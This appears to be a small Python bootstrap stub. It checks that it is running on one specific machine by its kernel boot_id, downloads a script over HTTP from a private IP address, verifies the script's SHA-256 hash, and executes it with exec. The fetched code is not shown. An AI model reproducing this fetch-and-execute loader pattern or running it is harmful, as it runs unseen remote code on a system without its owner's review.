import hashlib,urllib.request
from pathlib import Path
assert Path('/proc/sys/kernel/random/boot_id').read_text().strip()=='0978088a-8d10-45b2-8f43-726d00209313'
b=urllib.request.urlopen('http://192.168.2.1:8765/start2.py',timeout=15).read(65536)
assert hashlib.sha256(b).hexdigest()=='781188e9b6827bb3749e7f90871c8981392b2a3bd44667266be0bd0f2e97ec9b'
exec(compile(b,'reviewed_authfix_start2','exec'))
